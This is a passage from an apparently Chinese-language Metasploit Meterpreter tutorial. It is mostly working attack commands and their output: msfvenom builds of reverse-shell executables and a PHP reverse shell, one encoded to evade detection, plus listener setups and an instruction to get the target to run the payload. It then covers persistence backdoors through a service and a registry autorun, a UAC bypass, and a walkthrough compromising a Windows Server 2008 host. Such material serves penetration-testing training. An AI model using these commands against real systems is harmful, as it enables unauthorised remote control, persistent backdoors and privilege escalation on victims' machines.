<pre><code class="hljs nginx"><span lang="EN-US">&nbsp;&nbsp;&nbsp; <span class="hljs-attribute">sf</span> &lt;stephen_fewer<span class="hljs-variable">@harmonysecurity</span>.com&gt;</span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">Basic</span> options:</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">Name</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Current Setting&nbsp; Required&nbsp; Description</span></code></pre>
<pre><code class="hljs yaml"><span lang="EN-US"><span class="hljs-bullet">-</span><span class="hljs-meta">---</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-bullet">---------------</span>&nbsp; <span class="hljs-bullet">--------</span>&nbsp; <span class="hljs-bullet">-----------</span></span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">EXITFUNC</span>&nbsp;&nbsp;&nbsp; process&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-literal">yes</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Exit technique (Accepted: </span></code>''<code class="hljs powershell"><span lang="EN-US">, seh, thread, <span class="hljs-keyword">process</span>, none)</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">EXTENSIONS</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-literal">no</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Comma-separate list of extensions to load</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">EXTINIT</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-literal">no</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Initialization strings </span></code>for<code class="hljs"><span lang="EN-US"> extensions</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">LHOST</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-literal">yes</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The listen address</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">LPORT</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></code>4444<code class="hljs yaml"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-literal">yes</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-string">The</span> <span class="hljs-string">listen</span> <span class="hljs-string">port</span></span></code></pre>
<p>举例2：<span lang="EN-US&gt;"><br>
windows/x64/meterpreter/reverse_tcp</span></p>
<pre><code class="hljs groovy"><span lang="EN-US">load<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span><span class="hljs-string">reverse_tcp:</span></span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;</span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;</span></code></pre>
<pre><code class="hljs less"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-attribute">Name</span>: Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span></code></pre>
<pre><code class="hljs groovy"><span lang="EN-US"><span class="hljs-symbol">&nbsp;&nbsp;&nbsp;&nbsp; Module:</span> payload<span class="hljs-regexp">/windows/</span>x64<span class="hljs-regexp">/meterpreter/</span>reverse_tcp</span></code></pre>
<pre><code class="hljs less"><span lang="EN-US">&nbsp;&nbsp; <span class="hljs-attribute">Platform</span>: Windows</span></code></pre>
<pre><code class="hljs less"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-attribute">Arch</span>: x86_64</span></code></pre>
<pre><code class="hljs yaml"><span lang="EN-US"><span class="hljs-string">Needs</span> <span class="hljs-attr">Admin:</span> <span class="hljs-literal">No</span></span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"> <span class="hljs-attribute">Total</span> size: </span></code>449<code class="hljs"></code></pre>
<pre><code class="hljs less"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-attribute">Rank</span>: Normal</span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">Provided</span> by:</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US">&nbsp;&nbsp;&nbsp; <span class="hljs-attribute">skape</span> &lt;mmiller<span class="hljs-variable">@hick</span>.org&gt;</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US">&nbsp;&nbsp;&nbsp; <span class="hljs-attribute">sf</span> &lt;stephen_fewer<span class="hljs-variable">@harmonysecurity</span>.com&gt;</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US">&nbsp;&nbsp;&nbsp; <span class="hljs-attribute">OJ</span> Reeves</span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">Basic</span> options:</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">Name</span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current Setting&nbsp; Required&nbsp; Description</span></code></pre>
<pre><code class="hljs yaml"><span lang="EN-US"><span class="hljs-bullet">-</span><span class="hljs-meta">---</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-bullet">---------------</span>&nbsp; <span class="hljs-bullet">--------</span>&nbsp; <span class="hljs-bullet">-----------</span></span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">EXITFUNC</span>&nbsp; process&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-literal">yes</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Exit technique (Accepted: </span></code>''<code class="hljs powershell"><span lang="EN-US">, seh, thread, <span class="hljs-keyword">process</span>, none)</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">LHOST</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-literal">yes</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The listen address</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">LPORT</span>&nbsp;&nbsp;&nbsp;&nbsp; </span></code>4444<code class="hljs yaml"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-literal">yes</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-string">The</span> <span class="hljs-string">listen</span> <span class="hljs-string">port</span></span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;</span></code></pre>
<pre><code class="hljs less"><span lang="EN-US"><span class="hljs-attribute">Description</span>:</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US">&nbsp; <span class="hljs-attribute">Inject</span> the meterpreter server DLL via the Reflective</span></code></pre>
<p>从Arch看出，第一个可以用于<span lang="EN-US&gt;">x64, x86_64</span>而第二个只能x86_64。<span lang="EN-US&gt;"><br></span>这是需要注意的地方。</p>
<p>12.自选模块</p>
<p>生成执行计算器<span lang="EN-US&gt;">payload</span>例子：</p>
<p>msfvenom -p
windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; 1.exe</p>
<p>13.payload的坑</p>
<p>正常情况下，利用<span lang="EN-US&gt;">msfvenom</span>生成的木马文件，可直接上传到目标服务器上运行（加权限）。但我自己遇到过一个坑，生成的文件内容有部分是无用的，会引起报错，如下图所示。<span lang="EN-US&gt;"><br></span><a href="https://thief.one/upload_image/20170801/2.png"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025603103-963074557.gif" alt="" width="554" height="189" border="0"></a><br><a href="https://thief.one/upload_image/20170801/3.png"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025603484-1074141357.gif" alt="" width="554" height="158" border="0"></a><br>解决方案是<span lang="EN-US&gt;">vim</span>文件，删除文件开头两行无效的内容。</p>
<p>&nbsp;</p>
<h2>0x07获取meterpreter</h2>
<p><span lang="EN-US">1.</span>首先生成可执行文件</p>
<p>root
@ kali：〜＃msfvenom
-p &nbsp;windows/meterpreter/reverse_tcp
lhost=192.168.1.102 lport=4444&nbsp; -f exe -o &nbsp;shell.exe</p>
<p><span lang="EN-US">2.</span>启动<span lang="EN-US&gt;">msfconsole</span>，监听反连端口</p>
<p>root
@ kali：〜＃msfconsole</p>
<p>msf&gt;use&nbsp; exploit/multi /handler </p>
<p>msf
exploit（handler）<span lang="EN-US&gt;">&gt; set &nbsp;PAYLOAD
windows/meterpreter/reverse_tcp</span></p>
<p>PAYLOAD
=&gt; window /meterpreter/reverse_tcp</p>
<p>msf
exploit（handler）<span lang="EN-US&gt;">&gt; set LHOST 0.0.0.0</span></p>
<p>msf
exploit（handler）<span lang="EN-US&gt;">&gt;set&nbsp; LPORT &nbsp;444</span></p>
<p>msf
exploit（handler）<span lang="EN-US&gt;">&gt;show options</span></p>
<p>msf
exploit（handler）<span lang="EN-US&gt;">&gt;exploit</span></p>
<h2>0x08 持续性后门</h2>
<p><span lang="EN-US">1.metsvc</span>后渗透攻击模块</p>
<p>metsvc后渗透攻击模块其实就是将Meterpreter以系统服务的形式安装到目标主机，它会上传三个文件：</p>
<p>metsvc.dll</p>
<p>metsvc-service.exe</p>
<p>metsvc.exe</p>
<p>调用metsvc后渗透攻击模块</p>
<p>命令：run&nbsp; metsvc</p>
<p>效果如下图：</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025603968-424290475.gif" alt="" width="554" height="169"><br>执行过程：在目标主机上创建一个监听<span lang="EN-US&gt;">31337</span>端口的服务-&gt;在目标主机c:\windows\temp\下创建一个存放后门服务有关文件程序的目录，并上传<span lang="EN-US&gt;">metsrv.x86.dll</span>、metsvc-server.exe、<span lang="EN-US&gt;">metsvc.exe</span>三个文件到该目录下-&gt;开启服务</p>
<p>成功后：在目标主机上看到31337号端口已开，且服务多了一个<span lang="EN-US&gt;">meterpreter(</span>如下图)<br><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025604411-977033793.gif" alt="" width="554" height="235"><br><br><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025604909-1866331126.gif" alt="" width="554" height="315"></p>
<p>&nbsp;</p>
<p>使用方法：</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025605909-708751152.gif" alt="" width="553" height="376"></p>
<p>到目标机上，我们可以发现Meterpreter服务，正在开启监听并等待连接。</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025606352-1231848696.gif" alt="" width="554" height="390"></p>
<p>Meterpreter服务后门</p>
<div>
<p>meterpreter &gt; run metsvc</p>
<p>[*] Creating a meterpreter service on port 31337</p>
<p>[*] Creating a temporary installation directory
C:\Users\Croxy\AppData\Local\Temp\tuIKWqmuO...</p>
<p>[*]&nbsp; &gt;&gt;
Uploading metsrv.x86.dll...</p>
<p>[*]&nbsp; &gt;&gt;
Uploading metsvc-server.exe...</p>
<p>[*]&nbsp; &gt;&gt; Uploading
metsvc.exe...</p>
<p>[*] Starting the service...</p>
<p>* Installing service metsvc</p>
<p>* Starting service</p>
<p>* Service metsvc successfully installed.</p>

</div>
<p>之后电脑就默默生成了一个自启服务Meterpreter</p>
<p>然后连接后门</p>
<div>
<p>msf exploit(handler) &gt; use exploit/multi/handler</p>
<p>msf exploit(handler) &gt; set payload windows/metsvc_bind_tcp</p>
<p>payload =&gt; windows/metsvc_bind_tcp</p>
<p>msf exploit(handler) &gt; set RHOST 10.42.0.54</p>
<p>RHOST =&gt; 10.42.0.54</p>
<p>msf exploit(handler) &gt; set LPORT 31337</p>
<p>LPORT =&gt; 31337</p>
<p>msf exploit(handler) &gt; exploit</p>

</div>
<p><span lang="EN-US">2. persistence</span>模块后门</p>
<div>
<p>一个<span lang="EN-US">vbs</span>后门写入了开机启动项但是容易被发现还是需要大家发挥自己的智慧<span lang="EN-US">:)</span></p>
<p>&nbsp;</p>
<p>meterpreter &gt; run persistence -X -i 5 -p 23333 -r
10.42.0.1</p>
<p>[*] Running Persistance Script</p>
<p>[*] Resource file for cleanup created at
/home/croxy/.msf4/logs/persistence/TESTING_20150930.3914/TESTING_20150930.3914.rc</p>
<p>[*] Creating Payload=windows/meterpreter/reverse_tcp
LHOST=10.42.0.1 LPORT=23333</p>
<p>[*] Persistent agent script is 148453 bytes long</p>
<p>[+] Persistent Script written to
C:\Users\Croxy\AppData\Local\Temp\ulZpjVBN.vbs</p>
<p>[*] Executing script
C:\Users\Croxy\AppData\Local\Temp\ulZpjVBN.vbs</p>
<p>[+] Agent executed with PID 4140</p>
<p>[*] Installing into autorun as
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\okiASNRzcLenulr</p>
<p>[+] Installed into autorun as
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\okiASNRzcLenulr</p>

</div>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h2>0x09 meterpreter绕过uac</h2>
<p>由于绕过 UAC 的功能需在
meterpreter 的shell 才能实现。因此，我们首先要做的就是取得目标机器的<span lang="EN-US&gt;"> meterpreter shell </span>。</p>
<p>（<span lang="EN-US&gt;">1</span>）生成一个 payload </p>
<p>msfvenom -p
windows/meterpreter/reverse_tcp lhost=192.168.15.131 lport=4444 -f exe -o
/root/virus.exe -e x86/shikata_ga_nai -i 8</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025607162-1869060146.gif" alt="20161006093606" width="554" height="264"></p>
<p>将以上生成的 payload 发送给目标机器并让其执行<span lang="EN-US&gt;">!</span></p>
<p>（<span lang="EN-US&gt;">2</span>）kali 上配置一个反弹会话处理程序</p>
<p>msf&gt;use
exploit/multi/handler</p>
<p>msf&gt;set payload
windows/meterpreter/reverse_tcp</p>
<p>msf&gt;set LHOST 192.168.15.131</p>
<p>msf&gt;set LPORT 4444</p>
<p>msf&gt;exploit</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025607683-2117669758.gif" alt="20161006092923" width="554" height="153"></p>
<p>这里再介绍一种，生成反弹 shell 的方式。就是直接以<span lang="EN-US&gt;"> raw </span>的形式保存成文件只要目标进行了访问，就会反弹回 shell 。具体生成命令如下：</p>
<p>msfvenom -p php/meterpreter/reverse_tcp
LHOST=192.168.15.131 LPORT=4444 -f raw -o x.php</p>
<p>当目标机器成功执行payload后我们就取得了一个<span lang="EN-US&gt;"> meterpreter shell </span>。</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025608028-514920194.gif" alt="20161006094048" width="554" height="102"></p>
<p>（<span lang="EN-US&gt;">3</span>）利用 getuid 和
getsystem 命令来提权</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025608368-1620652029.gif" alt="20161006100046" width="554" height="111"></p>
<p>（<span lang="EN-US&gt;">4</span>）进行UAC权限绕过</p>
<p>从以上结果我们基本可以判定遭到了 UAC 的用户访问控制的拦截！既然这样，那么我们来利用<span lang="EN-US&gt;"> meterpreter </span>的强大功能来进行绕过！</p>
<p>msf&gt;use exploit/windows/local/ask</p>
<p>msf&gt;show options</p>
<p>msf&gt;set session 1</p>
<p>msf&gt;exploit</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025609005-1092314243.gif" alt="20161006104840" width="554" height="309"></p>
<p>当我们成功执行以上命令后，我们会在目标系统上弹出一个确认框只要点击确认即可成功绕过！现在我们再来通过<span lang="EN-US&gt;"> getuid </span>和 getsystem 命令来查看当前我们的<span lang="EN-US&gt;"> shell </span>权限：</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025609325-2045018623.gif" alt="20161006105606" width="554" height="80"></p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025609650-1843965370.gif" alt="20161006172248" width="554" height="98"></p>
<p>&nbsp;</p>
<h2>0x10 meterprter实战攻击windows2008r2x64</h2>
<p>攻击端:<br>
OS:Kali<br>
IP:192.168.111.129</p>
<p>被害端:<br>
OS:Windows server 2008 (64位)<br>
IP:192.168.111.133</p>
<p>(1)获取目标主机反弹shell</p>
<p>首先在Kali上生成meterpreter的<span lang="EN-US&gt;">payloa</span></p>
<p>root@Kali:~# msfpayload windows/meterpreter/reverse_tcp
LHOST=192.168.111.129 LPORT=2013 X &gt; file.exe&nbsp;&nbsp;</p>
<p>接下来是配置监听:</p>
<p>root@Kali:~# msfconsole</p>
<p>msf&nbsp;&gt;&nbsp;use&nbsp; exploit/multi/handler</p>
<p>msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp</p>
<p>msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;set&nbsp;LHOST&nbsp;192.168.111.129</p>
<p>msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;set&nbsp;LPORT&nbsp;2013</p>
<p>msf&nbsp;exploit(handler)&nbsp;&gt;&nbsp;exploit</p>
<p>然后在Windows2008上执行<span lang="EN-US">file.exe</span>,返回一个<span lang="EN-US">meterpreter</span></p>
<p>[*]&nbsp;Sending&nbsp;stage&nbsp;(769024&nbsp;bytes)&nbsp;to&nbsp;192.168.111.133</p>
<p>[*]&nbsp;Meterpreter&nbsp;session&nbsp;1&nbsp;opened&nbsp;(192.168.111.129:2013&nbsp;-&gt;&nbsp;192.168.111.133:49168)&nbsp;at2014-03-13&nbsp;22:23:18&nbsp;+0800</p>
<p>&nbsp;</p>
<p>meterpreter&nbsp;&gt;<br>(2).转移meterpreter到其他进程<br>在渗透过程中由于各种原因，当前<span lang="EN-US&gt;">meterpreter</span>进程很容易被干掉，将meterpreter转移到系统常驻进程是个好主意</p>
<p>meterpreter&nbsp;&gt;&nbsp;getuid&nbsp;&nbsp;//查看当前权限</p>
<p>Server&nbsp;username:&nbsp;WIN-K30V5SI0PCEAdministrator</p>
<p>meterpreter&nbsp;&gt;&nbsp;ps&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//列出当前进程</p>
<p>&nbsp;</p>
<p>Process&nbsp;List</p>
<p>============</p>
<p>&nbsp;</p>
<p>PID&nbsp;&nbsp;&nbsp;PPID&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Arch&nbsp;&nbsp;&nbsp;&nbsp;Session&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;User&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Path</p>
<p>---&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;-------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----</p>
<p>0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[System&nbsp;Process]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span lang="EN-US">4294967295</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
<p>4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p>244&nbsp;&nbsp;&nbsp;<span lang="EN-US">4</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;smss.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32smss.</span><span lang="EN-US">exe</span></p>
<p>264&nbsp;&nbsp;&nbsp;<span lang="EN-US">492</span>&nbsp;&nbsp;&nbsp;svchost.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;AUTHORITYLOCAL&nbsp;<span lang="EN-US">SERVICE</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32svchost.<span lang="EN-US">exe</span></p>
<p>336&nbsp;&nbsp;&nbsp;<span lang="EN-US">328</span>&nbsp;&nbsp;&nbsp;csrss.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32csrss.</span><span lang="EN-US">exe</span></p>
<p>388&nbsp;&nbsp;&nbsp;<span lang="EN-US">380</span>&nbsp;&nbsp;&nbsp;csrss.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">1</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32csrss.</span><span lang="EN-US">exe</span></p>
<p>396&nbsp;&nbsp;&nbsp;<span lang="EN-US">328</span>&nbsp;&nbsp;&nbsp;wininit.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86_<span lang="EN-US">64</span>&nbsp;&nbsp;<span lang="EN-US">0</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT&nbsp;<span lang="EN-US">AUTHORITYSYSTEM</span><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:WindowsSystem32wininit.</span><span lang="EN-US">exe</span></p>
